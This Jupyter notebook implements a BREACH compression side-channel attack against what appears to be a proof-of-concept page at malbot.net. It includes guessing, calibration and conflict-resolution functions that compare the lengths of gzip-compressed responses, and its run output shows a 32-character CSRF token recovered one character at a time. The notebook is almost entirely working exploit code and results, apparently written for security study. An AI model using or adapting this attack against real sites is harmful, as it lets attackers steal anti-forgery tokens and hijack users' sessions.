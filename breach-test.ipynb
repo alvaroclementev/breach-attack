{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import os\n",
    "import random\n",
    "#print(f'The process ID (for Fiddler filtering) is {os.getpid()}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# To disable warnigns in IPython:\n",
    "import warnings\n",
    "warnings.simplefilter('ignore')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [],
   "source": [
    "PROXY_SETTINGS = {  # So that it goes through Fiddler\n",
    "    \"http\": \"http://127.0.0.1:8888\",\n",
    "    \"https\": \"https://127.0.0.1:8888\"\n",
    "}\n",
    "\n",
    "res = requests.get(\"https://malbot.net/poc/?request_token='abcd\", proxies=PROXY_SETTINGS, verify=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Cache-Control': 'private', 'Content-Type': 'text/html; charset=utf-8', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Server': 'Microsoft-IIS/10.0', 'X-AspNet-Version': '4.0.30319', 'X-Powered-By': 'ASP.NET', 'Date': 'Tue, 13 Nov 2018 22:04:49 GMT', 'Content-Length': '2558'}"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res = requests.get(\"https://malbot.net/poc/?request_token='abcd\")\n",
    "res.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2558"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res_stream = requests.get(\"https://malbot.net/poc/?request_token='abcd\", stream=True)\n",
    "raw_bytes = res_stream.raw.read()\n",
    "len(raw_bytes)\n",
    "#raw_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Cache-Control': 'private', 'Content-Type': 'text/html; charset=utf-8', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Server': 'Microsoft-IIS/10.0', 'X-AspNet-Version': '4.0.30319', 'X-Powered-By': 'ASP.NET', 'Date': 'Tue, 13 Nov 2018 16:20:08 GMT', 'Content-Length': '2558'}"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res_stream.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "BASE_URL = \"https://malbot.net/poc/?request_token='\"\n",
    "SECRET_LENGTH = 32\n",
    "# DICTIONARY = list(map(str, range(10))) + ['a', 'b', 'c', 'd', 'e', 'f']\n",
    "DICTIONARY = list(map(lambda x: hex(x)[2], range(16))) # All possible 1 hex char combinations\n",
    "\n",
    "PROXY_SETTINGS = {  # So that it goes through Fiddler\n",
    "    \"http\": \"http://127.0.0.1:8888\",\n",
    "    \"https\": \"https://127.0.0.1:8888\"\n",
    "}\n",
    "\n",
    "def pad_character(char, pad_len):\n",
    "    \"\"\"\n",
    "    Surrounds the char with some padding to defeat Huffman Coding induced problems\n",
    "    \"\"\"\n",
    "    # TODO(Alvaro): implement this better\n",
    "    random_padding = '@' * pad_len\n",
    "    \n",
    "    rest_dictionary = '_'.join(filter(lambda x: x != char, DICTIONARY))\n",
    "    \n",
    "    return char + random_padding + \"---\" + rest_dictionary + '@@@@'\n",
    "    \n",
    "\n",
    "def get_request_length(url):\n",
    "    # TODO(Alvaro): Review how this might be implemented from the perspective of an eavesdropper\n",
    "    res_stream = requests.get(url, stream=True, proxies=PROXY_SETTINGS, verify=False)\n",
    "    raw_bytes = res_stream.raw.read()\n",
    "    return len(raw_bytes)\n",
    "\n",
    "   \n",
    "def calibrate(curr, pad_len, char1=DICTIONARY[0], char2=DICTIONARY[1]):\n",
    "    \"\"\"\n",
    "    To calibrate (establish the baseline for the current value of the guess), we need to send the first\n",
    "    2 guesses and compare them, there are 2 possible situations:\n",
    "      - If the length of both guesses is the same, that means that they are both wrong, or both are candidates, but we\n",
    "      have a baseline value for the wrong guess' lenght\n",
    "      - If the length is different, that means that we already have a possible candidate, and a baseline length\n",
    "    \"\"\"\n",
    "    url_1 = BASE_URL + curr + pad_character(char1, pad_len)\n",
    "    len_1 = get_request_length(url_1)\n",
    "    url_2 = BASE_URL + curr + pad_character(char2, pad_len)\n",
    "    len_2 = get_request_length(url_2)\n",
    "    \n",
    "    if len_1 == len_2:\n",
    "        # Both are wrong, or possible candidates, so we use it as baseline\n",
    "        return [char1, char2], len_1\n",
    "    elif len_1 < len_2:\n",
    "        # guess1 is the correct one, we set it as new baseline\n",
    "        # print(f'len_1={len_1}, len_2={len_2}')\n",
    "        return [char1], len_1\n",
    "    else:\n",
    "        # guess2 is the correct one, we set it as new baseline\n",
    "        # print(f'len_1={len_1}, len_2={len_2}')\n",
    "        return [char2], len_2\n",
    "\n",
    "def solve_conflict(curr, conflicted):\n",
    "    # Try different pad_lengths   \n",
    "    for iter_count in range(10): # Loop to avoid infinite loops in case of error\n",
    "        next_len = random.randint(10, 100)\n",
    "        candidates, baseline = calibrate(curr, next_len, char1=conflicted[0], char2=conflicted[1])\n",
    "        print(f'Solving conflict for curr = {curr} ; conflicted = {conflicted} ; trying with pad_len = {next_len}')\n",
    "        \n",
    "        for char in conflicted[2:]:\n",
    "            next_url = BASE_URL + curr + pad_character(char, next_len)\n",
    "            res_length = get_request_length(next_url)\n",
    "            \n",
    "            # Logic to decide whether this char is the best or not \n",
    "            if res_length < baseline: \n",
    "                # Baseline was wrong, reset results\n",
    "                candidates = [char]\n",
    "                baseline = res_length\n",
    "            elif res_length == baseline:\n",
    "                # This is a possible candidate\n",
    "                candidates.append(char)\n",
    "                \n",
    "        if len(candidates) == 1:\n",
    "            # Conflict solved!\n",
    "            next_guess = curr + candidates[0]\n",
    "            print(f'Guessed next character! (char = {candidates[0]}), new full guess is: {next_guess}')\n",
    "            return next_guess\n",
    "        elif len(candidates) > 1:\n",
    "            # The conflic was not resolved in this iteration... try again\n",
    "            conflicted = candidates\n",
    "        else:\n",
    "            # This should never happen...\n",
    "            print(f'ERROR! solving the conflict, the candidates\\'s length was negative...')\n",
    "            \n",
    "    print(f'ERROR! The conflict could not be resolved, left candidates = {candidates}')\n",
    "    return\n",
    "    \n",
    "def guess_next_char(curr, pad_len=40):\n",
    "    \"\"\"\n",
    "    Tries every possible request combinating the current guess with a char from the\n",
    "    dictionary, making a request and comparing the length of the body with a previous baseline.\n",
    "    \n",
    "    Initially the baseline length is unknown, so at least 2 tries are necessary to establish a baseline. \n",
    "    \"\"\"\n",
    "    candidates, baseline = calibrate(curr, pad_len)\n",
    "    \n",
    "    for char in DICTIONARY[2:]:\n",
    "        next_url = BASE_URL + curr + pad_character(char, pad_len)\n",
    "        res_length = get_request_length(next_url)\n",
    "        \n",
    "        # Logic to decide whether this char is the best or not \n",
    "        if res_length < baseline: \n",
    "            # Baseline was wrong, reset results\n",
    "            candidates = [char]\n",
    "            baseline = res_length\n",
    "        elif res_length == baseline:\n",
    "            # This is a possible candidate\n",
    "            candidates.append(char)\n",
    "    \n",
    "    # Finished\n",
    "    if len(candidates) == 1:\n",
    "        # We have a winner!\n",
    "        next_guess = curr + candidates[0]\n",
    "        print(f'Guessed next character! (char = {candidates[0]}), new full guess is: {next_guess}')\n",
    "        return next_guess\n",
    "    elif len(candidates) > 1:\n",
    "        # We have conflicts... solve them!:\n",
    "        return solve_conflict(curr, candidates)\n",
    "    else: # Should not happen...\n",
    "        print(f'ERROR! For the current result: {curr}, the was no candidates found!')\n",
    "        return\n",
    "\n",
    "def calibrate_old(curr):\n",
    "    \"\"\"\n",
    "    To calbrate (establish the baseline for the current value of the guess), we need to send the first\n",
    "    2 guesses and compare them, there are 2 possible situations:\n",
    "      - If the length of both guesses is the same, that means that they are both wrong, but we\n",
    "      hava a baseline value for the wrong guess' lenght\n",
    "      - If the length is different, that means that we already have a winner\n",
    "    \"\"\"\n",
    "    url_1 = BASE_URL + curr + pad_character(DICTIONARY[0])\n",
    "    len_1 = get_request_length(url_1)\n",
    "    url_2 = BASE_URL + curr + pad_character(DICTIONARY[1])\n",
    "    len_2 = get_request_length(url_2)\n",
    "    \n",
    "    if len_1 == len_2:\n",
    "        # Both are wrong, and we have a baseline\n",
    "        return \"baseline\", len_1\n",
    "    elif len_1 < len_2:\n",
    "        # guess1 is the correct one!\n",
    "        print(f'len_1={len_1}, len_2={len_2}')\n",
    "        return \"done\", DICTIONARY[0]\n",
    "    else:\n",
    "        # guess2 is the correct one!\n",
    "        print(f'len_1={len_1}, len_2={len_2}')\n",
    "        return \"done\", DICTIONARY[1]\n",
    "\n",
    "\n",
    "def guess_next_char_old(curr):\n",
    "    \"\"\"\n",
    "    Tries every possible request combinating the current guess with a char from the\n",
    "    dictionary, making a request and comparing the length of the body with a previous baseline.\n",
    "    \n",
    "    Initially the baseline length is unknown, so at least 2 tries are necessary to establish a baseline. \n",
    "    \"\"\"\n",
    "    res_type, res = calibrate(curr)\n",
    "    if res_type == \"done\":\n",
    "        next_guess = curr + res\n",
    "        print(f'Guessed next character in calibration phase! (char = {res}), new full guess is: {next_guess}')\n",
    "        return next_guess\n",
    "    else: # res_type is \"baseline\"\n",
    "        # We did not guess correctly during calibration, but a wrong guess baseline was established\n",
    "        baseline = res\n",
    "    \n",
    "    for char in DICTIONARY[2:]:\n",
    "        \n",
    "        next_url = BASE_URL + curr + pad_character(char)\n",
    "        res_length = get_request_length(next_url)\n",
    "        \n",
    "        # Logic to decide whether this char is the best or not \n",
    "        if res_length < baseline: \n",
    "            # SUCCESS! THIS IS THE CHARACTER\n",
    "            next_guess = curr + char\n",
    "            print(f'Guessed next character! (char = {char}), new full guess is: {next_guess}')\n",
    "            return next_guess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 2 Tries implementation to compare\n",
    "def pad_character_2_tries(char, first=True):\n",
    "    random_padding = \"@\" * 10\n",
    "        \n",
    "    return char + random_padding if first else random_padding + char \n",
    "    \n",
    "def guess_next_char_2_tries(curr):\n",
    "    \"\"\"\n",
    "    Tries every possible request combinating the current guess with a char from the\n",
    "    dictionary, making a request and comparing the length of the body with a previous baseline.\n",
    "    \n",
    "    Initially the baseline length is unknown, so at least 2 tries are necessary to establish a baseline. \n",
    "    \"\"\"\n",
    "    for char in DICTIONARY:\n",
    "        # 2 Tries\n",
    "        url_1 = BASE_URL + curr + pad_character_2_tries(char)\n",
    "        len_1 = get_request_length(url_1)\n",
    "        url_2 = BASE_URL + curr + pad_character_2_tries(char, first=False)\n",
    "        len_2 = get_request_length(url_2)\n",
    "        \n",
    "        # Logic to decide whether this char is the best guess or not \n",
    "        if len_1 < len_2:\n",
    "            # SUCCESS! THIS IS THE CHARACTER\n",
    "            next_guess = curr + char\n",
    "            print(f'Guessed next character! (char = {char}), new full guess is: {next_guess}')\n",
    "            return next_guess\n",
    "        elif len_1 > len_2:\n",
    "            # Should not happen?\n",
    "            print(f'Ugh! len_1 < len_2! ({len_1} < {len_2})')\n",
    "            return\n",
    "        else:\n",
    "            # This isn't it, try the next one\n",
    "            continue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Guessed next character! (char = 1), new full guess is: bb1\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'bb1'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "guess_next_char_2_tries(\"bb\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Guessed next character! (char = b), new full guess is: b\n",
      "Guessed next character! (char = b), new full guess is: bb\n",
      "Guessed next character! (char = 6), new full guess is: bb6\n",
      "Guessed next character! (char = 3), new full guess is: bb63\n",
      "Guessed next character! (char = e), new full guess is: bb63e\n",
      "Guessed next character! (char = 4), new full guess is: bb63e4\n",
      "Guessed next character! (char = b), new full guess is: bb63e4b\n",
      "Solving conflict for curr = bb63e4b ; conflicted = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] ; trying with pad_len = 53\n",
      "Guessed next character! (char = a), new full guess is: bb63e4ba\n",
      "Guessed next character! (char = 6), new full guess is: bb63e4ba6\n",
      "Guessed next character! (char = 7), new full guess is: bb63e4ba67\n",
      "Solving conflict for curr = bb63e4ba67 ; conflicted = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] ; trying with pad_len = 19\n",
      "Solving conflict for curr = bb63e4ba67 ; conflicted = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] ; trying with pad_len = 36\n",
      "Solving conflict for curr = bb63e4ba67 ; conflicted = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] ; trying with pad_len = 85\n",
      "Guessed next character! (char = e), new full guess is: bb63e4ba67e\n",
      "Guessed next character! (char = 2), new full guess is: bb63e4ba67e2\n",
      "Guessed next character! (char = 4), new full guess is: bb63e4ba67e24\n",
      "Guessed next character! (char = d), new full guess is: bb63e4ba67e24d\n",
      "Guessed next character! (char = a), new full guess is: bb63e4ba67e24da\n",
      "Guessed next character! (char = b), new full guess is: bb63e4ba67e24dab\n",
      "Guessed next character! (char = 8), new full guess is: bb63e4ba67e24dab8\n",
      "Guessed next character! (char = 1), new full guess is: bb63e4ba67e24dab81\n",
      "Guessed next character! (char = e), new full guess is: bb63e4ba67e24dab81e\n",
      "Guessed next character! (char = d), new full guess is: bb63e4ba67e24dab81ed\n",
      "Guessed next character! (char = 4), new full guess is: bb63e4ba67e24dab81ed4\n",
      "Guessed next character! (char = 2), new full guess is: bb63e4ba67e24dab81ed42\n",
      "Guessed next character! (char = 5), new full guess is: bb63e4ba67e24dab81ed425\n",
      "Guessed next character! (char = c), new full guess is: bb63e4ba67e24dab81ed425c\n",
      "Guessed next character! (char = 5), new full guess is: bb63e4ba67e24dab81ed425c5\n",
      "Guessed next character! (char = a), new full guess is: bb63e4ba67e24dab81ed425c5a\n",
      "Guessed next character! (char = 9), new full guess is: bb63e4ba67e24dab81ed425c5a9\n",
      "Guessed next character! (char = 5), new full guess is: bb63e4ba67e24dab81ed425c5a95\n",
      "Guessed next character! (char = b), new full guess is: bb63e4ba67e24dab81ed425c5a95b\n",
      "Guessed next character! (char = 7), new full guess is: bb63e4ba67e24dab81ed425c5a95b7\n",
      "Solving conflict for curr = bb63e4ba67e24dab81ed425c5a95b7 ; conflicted = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] ; trying with pad_len = 98\n",
      "Guessed next character! (char = a), new full guess is: bb63e4ba67e24dab81ed425c5a95b7a\n",
      "Guessed next character! (char = 2), new full guess is: bb63e4ba67e24dab81ed425c5a95b7a2\n",
      "The CSRF token is: bb63e4ba67e24dab81ed425c5a95b7a2\n"
     ]
    }
   ],
   "source": [
    "# MAIN\n",
    "current_guess = \"\"\n",
    "# Watch end condition... for now we presume we know the expected length of the secret\n",
    "for _ in range(SECRET_LENGTH):\n",
    "    next_guess = guess_next_char(current_guess)\n",
    "    if next_guess is None:\n",
    "        # Something went wrong and could not guess next char\n",
    "        print(f'Whoops... no guess was found with the current_guess = {current_guess}')\n",
    "        break\n",
    "    else:\n",
    "        current_guess = next_guess\n",
    "\n",
    "print(f'The CSRF token is: ' + current_guess)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is **Almost** right, but at some point it gets confused and starts guessing fs and 0s...\n",
    "See if there is a problem with calibration... maybe choose the BEST winner? do something with a group of potential winners?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Guessed next character! (char = e), new full guess is: bb63e4ba67e\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'0-2-3-4-5-6-7-8-9-a-b-c-d-e-f'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Debug\n",
    "guess_next_char(\"bb63e4ba67\")\n",
    "'-'.join(filter(lambda x: x != '1', DICTIONARY))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Guessed next character! (char = d), new full guess is: bb63e4ba67e24d\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'bb63e4ba67e24d'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "guess_next_char(\"bb63e4ba67e24\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# requests.get('https://malbot.net/poc/request_token=a{}{}{}{}{}bla', proxies=PROXY_SETTINGS, verify=False, config={'encode_uri':False})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
